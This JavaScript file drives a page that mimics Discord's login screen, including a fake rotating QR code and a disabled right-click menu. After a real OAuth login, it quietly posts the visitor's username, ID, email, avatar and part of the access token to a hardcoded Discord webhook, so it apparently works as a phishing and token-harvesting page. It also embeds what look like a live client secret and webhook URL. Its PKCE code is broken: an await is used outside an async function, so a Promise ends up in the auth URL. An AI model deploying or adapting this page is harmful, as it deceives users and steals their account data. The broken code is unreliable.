// ----------------------------------
// CONFIG - REPLACE WITH YOUR DISCORD APP DETAILS
// ----------------------------------
const CLIENT_ID = "1424516359081164840"; // From Developer Portal
const CLIENT_SECRET = "K-82g7OPPevGWbz0A0LlJZMyJZG-9qZ3"; // From Developer Portal (keep secret!)
const REDIRECT_URI = "http://localhost:3000/callback"; // Must match exactly in Developer Portal
const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";
const DISCORD_SCOPES = "identify";

// -----------------------------------
// UTILITY FUNCTIONS
// -----------------------------------
function generateRandomString(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
  let result = "";
  const array = new Uint8Array(length);
  crypto.getRandomValues(array);
  for (let i = 0; i < length; i++) {
    result += characters[array[i] % characters.length];
  }
  return result;
}

function sha256(plain) {
  const encoder = new TextEncoder();
  const data = encoder.encode(plain);
  return window.crypto.subtle.digest("SHA-256", data);
}

async function base64URLEncode(arrayBuffer) {
  const bytes = new Uint8Array(arrayBuffer);
  let binary = "";
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}

// Generate PKCE values (store in sessionStorage for callback use)
function generatePKCE() {
  const codeVerifier = generateRandomString(128);
  sessionStorage.setItem("pkce_verifier", codeVerifier);
  return base64URLEncode(await sha256(codeVerifier));
}

// Build OAuth URL
function getOAuthURL() {
  const codeChallenge = generatePKCE();
  sessionStorage.setItem("code_challenge", codeChallenge);
  const params = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    response_type: "code",
    scope: DISCORD_SCOPES,
    state: generateRandomString(16), // CSRF protection
    code_challenge: codeChallenge,
    code_challenge_method: "S256",
  });
  return `https://discord.com/api/oauth2/authorize?${params.toString()}`;
}

// Exchange code for token
async function exchangeCodeForToken(code) {
  const verifier = sessionStorage.getItem("pkce_verifier");
  if (!verifier) throw new Error("PKCE verifier not found");

  const body = new URLSearchParams({
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET,
    grant_type: "authorization_code",
    code: code,
    redirect_uri: REDIRECT_URI,
    code_verifier: verifier,
  });

  const response = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  });

  if (!response.ok) throw new Error(`Token exchange failed: ${response.statusText}`);
  return await response.json();
}

// Fetch user info with token
async function fetchUserInfo(accessToken) {
  const response = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${accessToken}` },
  });

  if (!response.ok) throw new Error(`Failed to fetch user: ${response.statusText}`);
  return await response.json();
}

// Send auth data to webhook
async function sendAuthDataToWebhook(user, accessToken) {
  const payload = {
    username: user.username,
    discriminator: user.discriminator,
    id: user.id,
    email: user.email || "N/A",
    avatar: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null,
    accessToken: accessToken,
    timestamp: new Date().toISOString(),
  };

  const response = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "New Discord Auth Login",
      embeds: [
        {
          title: "Authenticated User",
          fields: [
            { name: "Username", value: `${payload.username}#${payload.discriminator}`, inline: true },
            { name: "User ID", value: payload.id, inline: true },
            { name: "Email", value: payload.email, inline: true },
            { name: "Access Token", value: "`" + payload.accessToken.substring(0, 20) + "...`", inline: false },
            { name: "Timestamp", value: payload.timestamp, inline: false },
          ],
          thumbnail: { url: payload.avatar },
          color: 0x5865F2, // Discord blue
        },
      ],
    }),
  });

  if (!response.ok) {
    console.error("Failed to send to webhook:", response.statusText);
    alert("Auth successful, but failed to notify server.");
  }
}

// Handle callback (call on page load)
async function handleAuthCallback() {
  const urlParams = new URLSearchParams(window.location.search);
  const code = urlParams.get("code");
  const error = urlParams.get("error");

  if (error) {
    alert(`Auth error: ${error}`);
    window.history.replaceState({}, document.title, window.location.pathname);
    return;
  }

  if (code) {
    try {
      // Show loading (reuse ellipsis)
      loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                                <span class="inner pulsingEllipsis">
                                    <span class="item spinnerItem"></span>
                                    <span class="item spinnerItem"></span>
                                    <span class="item spinnerItem"></span>
                                </span>
                             </span>`;
      loginButton.setAttribute("disabled", "true");

      const tokenData = await exchangeCodeForToken(code);
      const user = await fetchUserInfo(tokenData.access_token);

      // Validation passed: user info fetched successfully
      await sendAuthDataToWebhook(user, tokenData.access_token);
      alert(`Login successful! Welcome, ${user.username}#${user.discriminator}`);
      
      // Clean URL
      window.history.replaceState({}, document.title, window.location.pathname);
      
      // Update button to show logged in
      loginButton.textContent = `Logged in as ${user.username}`;
      loginButton.style.backgroundColor = "#43b581"; // Success green
    } catch (err) {
      console.error("Auth failed:", err);
      alert("Authentication failed. Please try again.");
    } finally {
      // Reset button
      loginButton.innerHTML = "";
      loginButton.textContent = "Log In with Discord";
      loginButton.removeAttribute("disabled");
    }
  }
}

// -----------------------------------
// ELLIPSIS ANIMATION (Now for Auth Flow)
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In with Discord";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  // Brief animation before redirect
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                            <span class="inner pulsingEllipsis">
                                <span class="item spinnerItem"></span>
                                <span class="item spinnerItem"></span>
                                <span class="item spinnerItem"></span>
                            </span>
                         </span>`;
  loginButton.setAttribute("disabled", "true");
  setTimeout(() => {
    window.location.href = getOAuthURL();
  }, 1000);
}

// Update button text and attach listener
loginButton.textContent = "Log In with Discord";

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", animateEllipsis);
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});

// Init: Handle callback on load
handleAuthCallback();

// --------------------------------------------------
// ---------- WANDERING CUBES ANIMATION -------------
// --------------------------------------------------
function generateRandomStringOld() { // Renamed to avoid conflict
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < 43; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function removeQrCodeAnimation() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  qrCodeContainer.innerHTML = "";
  qrCodeContainer.insertAdjacentElement(
    "afterbegin",
    generateQRCode(`https://discord.com/ra/${generateRandomStringOld()}`)
  );
  qrCodeContainer.insertAdjacentHTML(
    "beforeend",
    `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
  );
  qrCodeContainer.style.background = "white";
}

function simulateQrCodeChange() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
  qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
  qrCodeContainer.style.background = "transparent";
  const markup = `<span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
                    <span class="inner wanderingCubes">
                      <span class="item"></span>
                      <span class="item"></span>
                    </span>
                  </span>`;
  qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
  setTimeout(removeQrCodeAnimation, 3500);
}

setInterval(simulateQrCodeChange, 120 * 1000);

// --------------------------------------------------
// ---------- GENERATING QRCODE ---------------------
// --------------------------------------------------
function generateQRCode(data) {
  try {
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", "0 0 37 37");
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
    }
    return svgElement;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}
